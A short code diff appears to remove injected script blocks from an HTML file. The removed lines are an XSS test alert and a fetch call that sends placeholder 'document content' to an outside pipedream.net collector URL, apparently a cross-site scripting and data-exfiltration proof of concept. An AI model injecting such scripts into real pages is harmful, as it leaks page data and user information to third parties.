@@ -1,15 +1,1 @@
-<script>alert('1');</script>
 
-<script>
-  // Shortened version of the HTML document as a string (for demonstration)
-  const documentShortString = "shortened_content_here";
-
-  // Pre-defined URL
-  const url = "https://eng42lverq94b.x.pipedream.net";
-
-  // Use Fetch API to send the shortened document content to the pre-defined URL via GET
-  fetch(`${url}?documentContent=${encodeURIComponent(documentShortString)}`)
-    .then(response => response.json())
-    .then(data => console.log("Document sent successfully:", data))
-    .catch(error => console.error("Error sending document:", error));
-</script>
